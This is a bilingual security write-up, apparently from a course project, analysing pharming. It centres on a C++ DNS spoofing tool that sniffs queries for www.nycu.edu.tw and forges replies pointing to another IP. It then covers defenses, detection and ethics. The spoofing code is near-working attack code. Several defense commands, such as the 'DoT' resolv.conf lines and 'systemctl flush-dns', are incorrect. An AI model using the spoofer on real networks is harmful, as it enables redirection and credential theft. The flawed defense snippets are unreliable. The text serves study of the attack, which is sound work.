# Pharming Attacks Analysis - Advanced Network Security Threats

## Pharming 攻擊概述 (Pharming Attack Overview)

Pharming 是一種網路攻擊技術，攻擊者通過操縱域名解析過程，將用戶重定向到偽造的網站，即使他們輸入了正確的 URL。與 Phishing 不同，Pharming 不需要用戶點擊惡意連結，而是直接操縱 DNS 解析過程。

## Pharming 攻擊類型 (Types of Pharming Attacks)

### 1. DNS Cache Poisoning (DNS 快取投毒)
- **攻擊目標**: DNS 伺服器的快取記錄
- **攻擊方式**: 向 DNS 伺服器注入偽造的 DNS 記錄
- **影響範圍**: 所有使用該 DNS 伺服器的用戶
- **持續時間**: 直到 TTL 過期或快取被清除

### 2. DNS Spoofing (DNS 欺騙)
- **攻擊目標**: 用戶的 DNS 查詢
- **攻擊方式**: 攔截並偽造 DNS 回應
- **影響範圍**: 同一網段內的用戶
- **持續時間**: 攻擊者持續攔截期間

### 3. Hosts File Modification (Hosts 檔案修改)
- **攻擊目標**: 用戶系統的 hosts 檔案
- **攻擊方式**: 修改本地域名解析規則
- **影響範圍**: 單一用戶系統
- **持續時間**: 直到 hosts 檔案被修復

### 4. Router-based Pharming (路由器 Pharming)
- **攻擊目標**: 路由器的 DNS 設定
- **攻擊方式**: 修改路由器的 DNS 伺服器設定
- **影響範圍**: 連接到該路由器的所有設備
- **持續時間**: 直到路由器設定被修復

## 本專案實現的 Pharming 攻擊 (Implemented Pharming Attack)

### DNS Spoofing 實現分析

#### 攻擊目標設定
```cpp
const string target_domain = "www.nycu.edu.tw";
const IPv4Address spoofed_ip("140.113.24.241");
```

**攻擊目標**: 將國立陽明交通大學的官方網站重定向到偽造的 IP 地址

#### 攻擊流程詳細分析

##### 1. 網路監聽階段
```cpp
SnifferConfiguration config;
config.set_promisc_mode(true);        // 啟用混雜模式
config.set_immediate_mode(true);      // 立即模式
config.set_filter("udp and dst port 53");  // DNS 查詢過濾

Sniffer sniffer(interface_name, config);
sniffer.sniff_loop(handle_packet);
```

**技術要點**:
- **混雜模式**: 讓網卡接收所有經過的封包
- **即時處理**: 減少封包處理延遲，提高攻擊成功率
- **精確過濾**: 只處理 DNS 查詢封包，提高效率

##### 2. DNS 查詢攔截
```cpp
bool handle_packet(const PDU& pdu) {
    const EthernetII& eth = pdu.rfind_pdu<EthernetII>();
    const IP& ip = eth.rfind_pdu<IP>();
    const UDP& udp = ip.rfind_pdu<UDP>();
    
    if (udp.dport() != 53) return true;
    
    const DNS dns = udp.rfind_pdu<RawPDU>().to<DNS>();
    
    if (dns.type() != DNS::QUERY || dns.queries().empty()) {
        return true;
    }
    
    for (const auto& query : dns.queries()) {
        cout << "[*] DNS query for: " << query.dname() << endl;
        
        if (query.dname() == target_domain && query.query_type() == DNS::A) {
            return spoof_dns_response(eth, ip, udp, dns, query);
        }
    }
    return true;
}
```

**攔截過程**:
1. **封包解構**: 從 Ethernet 封包中提取各層協定
2. **協定驗證**: 確認是 UDP port 53 的 DNS 查詢
3. **查詢解析**: 解析 DNS 查詢內容
4. **目標匹配**: 檢查是否為攻擊目標域名
5. **類型驗證**: 確認是 A 記錄查詢 (IPv4 地址)

##### 3. 偽造 DNS 回應
```cpp
bool spoof_dns_response(const EthernetII& eth, const IP& ip, const UDP& udp, const DNS& dns, const DNS::query& query) {
    cout << "[+] Target domain match found: " << target_domain << endl;
    
    // 建立偽造的 DNS 回應
    DNS spoofed_dns;
    spoofed_dns.id(dns.id());                    // 保持原始查詢 ID
    spoofed_dns.type(DNS::RESPONSE);             // 設定為回應類型
    spoofed_dns.recursion_desired(dns.recursion_desired());
    spoofed_dns.recursion_available(true);       // 聲稱支援遞歸查詢
    spoofed_dns.add_query(query);                // 添加原始查詢
    
    // 建立偽造的 A 記錄
    DNS::resource answer;
    answer.dname(target_domain);                 // 目標域名
    answer.query_type(DNS::A);                   // A 記錄類型
    answer.query_class(query.query_class());     // 查詢類別
    answer.ttl(300);                            // TTL 300 秒
    answer.data(spoofed_ip.to_string());        // 偽造的 IP 地址
    
    spoofed_dns.add_answer(answer);
    
    // 重建封包
    EthernetII response_eth(eth.src_addr(), eth.dst_addr());
    IP response_ip(ip.src_addr(), ip.dst_addr());
    UDP response_udp(udp.sport(), udp.dport());
    
    auto packet = response_eth / response_ip / response_udp / spoofed_dns;
    
    try {
        sender.send(packet);
        cout << "[+] Spoofed DNS response sent to " << ip.src_addr() << endl;
        return true;
    } catch (exception& e) {
        cerr << "[-] Failed to send packet: " << e.what() << endl;
        return false;
    }
}
```

**偽造要點**:
- **ID 匹配**: 使用原始查詢的 ID 確保回應被接受
- **查詢複製**: 完整複製原始查詢記錄
- **回應標記**: 設定適當的 DNS 回應標記
- **TTL 設定**: 設定合理的快取時間 (300 秒)
- **錯誤處理**: 包含完整的錯誤處理機制

## Pharming 攻擊的技術細節 (Technical Details)

### DNS 協定分析

#### DNS 查詢封包結構
```
DNS Query Packet:
+------------------+
| Ethernet Header  |
+------------------+
| IP Header        |
+------------------+
| UDP Header       |
+------------------+
| DNS Header       |
+------------------+
| DNS Query        |
+------------------+
```

#### DNS 回應封包結構
```
DNS Response Packet:
+------------------+
| Ethernet Header  |
+------------------+
| IP Header        |
+------------------+
| UDP Header       |
+------------------+
| DNS Header       |
+------------------+
| DNS Query        |
+------------------+
| DNS Answer       |
+------------------+
```

### 攻擊成功條件分析

#### 1. 網路位置要求
- **同一網段**: 攻擊者與受害者必須在同一網段
- **封包攔截**: 能夠攔截受害者的 DNS 查詢
- **回應速度**: 偽造回應必須比合法 DNS 伺服器更快

#### 2. 技術要求
- **封包格式**: 偽造封包必須符合 DNS 協定標準
- **ID 匹配**: 必須使用正確的查詢 ID
- **協定相容**: 必須支援受害者的 DNS 查詢格式

#### 3. 時機要求
- **查詢攔截**: 必須在受害者發送查詢時立即攔截
- **回應優先**: 偽造回應必須先於合法回應到達
- **持續監控**: 必須持續監控新的 DNS 查詢

## Pharming 攻擊的影響分析 (Impact Analysis)

### 1. 直接影響 (Direct Impact)

#### 用戶層面
- **網站重定向**: 用戶被重定向到偽造的網站
- **憑證竊取**: 偽造網站可能竊取用戶登入憑證
- **惡意軟體**: 可能下載惡意軟體到用戶系統
- **資料洩露**: 敏感資料可能被竊取

#### 組織層面
- **品牌損害**: 組織的網路安全聲譽受損
- **客戶信任**: 客戶對組織的信任度下降
- **法律責任**: 可能面臨法律訴訟和監管處罰
- **經濟損失**: 可能造成直接的經濟損失

### 2. 間接影響 (Indirect Impact)

#### 網路安全
- **協定信任**: 破壞對 DNS 協定的信任
- **安全意識**: 降低用戶的網路安全意識
- **防護機制**: 需要更複雜的防護機制

#### 社會影響
- **網路安全**: 整體網路安全環境惡化
- **技術發展**: 推動更安全的網路技術發展
- **法規制定**: 促進相關法規的制定和完善

## 防護機制分析 (Defense Mechanism Analysis)

### 1. 技術防護 (Technical Defense)

#### DNSSEC (DNS Security Extensions)
```bash
# 啟用 DNSSEC 驗證
echo "options edns0" >> /etc/resolv.conf
echo "options trust-ad" >> /etc/resolv.conf
```

**防護原理**:
- 使用數位簽章驗證 DNS 回應
- 防止回應被篡改
- 提供資料完整性保護

**優點**:
- 提供強力的安全保護
- 符合國際標準
- 廣泛支援

**缺點**:
- 需要 DNS 伺服器支援
- 可能影響查詢效能
- 設定複雜

#### DNS over HTTPS (DoH)
```javascript
// 使用 DoH 進行 DNS 查詢
const dohUrl = 'https://cloudflare-dns.com/dns-query';
const query = 'https://cloudflare-dns.com/dns-query?name=example.com&type=A';
```

**防護原理**:
- 使用 HTTPS 加密 DNS 查詢
- 防止中間人攔截
- 提供端到端加密

**優點**:
- 加密傳輸
- 防止監聽
- 易於部署

**缺點**:
- 需要瀏覽器支援
- 可能影響隱私
- 集中化風險

#### DNS over TLS (DoT)
```bash
# 使用 DoT 進行 DNS 查詢
echo "nameserver 8.8.8.8" > /etc/resolv.conf
echo "nameserver 1.1.1.1" >> /etc/resolv.conf
```

**防護原理**:
- 使用 TLS 加密 DNS 查詢
- 提供傳輸層安全
- 防止封包攔截

### 2. 網路防護 (Network Defense)

#### 網路分段
```bash
# 使用 VLAN 隔離網路
vlan 100: 管理網路
vlan 200: 用戶網路
vlan 300: 伺服器網路
```

**防護原理**:
- 限制攻擊範圍
- 提供多層防護
- 便於監控和管理

#### 入侵檢測系統
```python
# 範例: DNS 異常檢測
def detect_dns_anomaly():
    if dns_response_time < threshold:
        alert("Potential DNS spoofing detected")
    
    if dns_response_source != expected_source:
        alert("Suspicious DNS response source")
```

**防護原理**:
- 即時監控 DNS 查詢
- 檢測異常回應
- 自動回應威脅

### 3. 用戶防護 (User Defense)

#### 安全瀏覽器設定
```bash
# 啟用安全瀏覽功能
chrome --enable-features=SafeBrowsingEnhancedProtection
```

**防護原理**:
- 檢測惡意網站
- 警告可疑活動
- 提供安全建議

#### 用戶教育
- **安全意識**: 提高用戶的網路安全意識
- **最佳實踐**: 推廣安全瀏覽最佳實踐
- **威脅識別**: 教育用戶識別網路威脅

## 檢測和回應 (Detection and Response)

### 1. 檢測方法 (Detection Methods)

#### 網路監控
```bash
# 監控 DNS 查詢和回應
tcpdump -i any port 53

# 監控異常的 DNS 回應
tcpdump -i any port 53 and udp[10:2] & 0x8000
```

#### 日誌分析
```bash
# 分析 DNS 查詢日誌
grep "www.nycu.edu.tw" /var/log/dns.log

# 分析異常的 IP 地址
grep "140.113.24.241" /var/log/dns.log
```

#### 行為分析
```python
# 範例: DNS 回應時間分析
def analyze_dns_response_time():
    if response_time < normal_time * 0.5:
        alert("Potential DNS spoofing")
```

### 2. 回應措施 (Response Measures)

#### 立即回應
```bash
# 清除 DNS 快取
sudo systemctl flush-dns

# 重啟 DNS 服務
sudo systemctl restart systemd-resolved
```

#### 長期回應
```bash
# 更新 DNS 設定
echo "nameserver 8.8.8.8" > /etc/resolv.conf

# 啟用 DNSSEC
echo "options edns0" >> /etc/resolv.conf
```

## 法律和道德考量 (Legal and Ethical Considerations)

### 1. 法律責任 (Legal Liability)

#### 刑事責任
- **電腦犯罪**: 可能違反電腦犯罪相關法律
- **詐欺罪**: 可能涉及詐欺行為
- **侵犯隱私**: 可能侵犯他人隱私權

#### 民事責任
- **損害賠償**: 可能面臨損害賠償訴訟
- **名譽損害**: 可能造成名譽損害
- **經濟損失**: 可能造成經濟損失

### 2. 道德考量 (Ethical Considerations)

#### 研究倫理
- **知情同意**: 必須獲得所有相關方的同意
- **最小傷害**: 最小化對他人的傷害
- **透明度**: 保持研究的透明度

#### 社會責任
- **安全意識**: 提高社會的安全意識
- **技術發展**: 促進安全技術的發展
- **教育目的**: 用於教育和研究目的

## 結論 (Conclusion)

Pharming 攻擊是一種嚴重的網路安全威脅，可能導致：

1. **憑證竊取**: 用戶的登入憑證被竊取
2. **惡意軟體**: 惡意軟體被下載到用戶系統
3. **資料洩露**: 敏感資料被竊取
4. **品牌損害**: 組織的聲譽受損

有效的防護需要多層次的方法：

1. **技術防護**: DNSSEC、DoH、DoT
2. **網路防護**: 網路分段、入侵檢測
3. **用戶防護**: 安全瀏覽、用戶教育
4. **監控回應**: 即時監控、快速回應

理解這些攻擊技術有助於：
- 提高網路安全意識
- 開發更好的防護機制
- 進行有效的安全測試
- 教育用戶安全最佳實踐

記住，這些技術應該只用於合法的安全研究和教育目的，並且必須遵守相關的法律和道德規範。
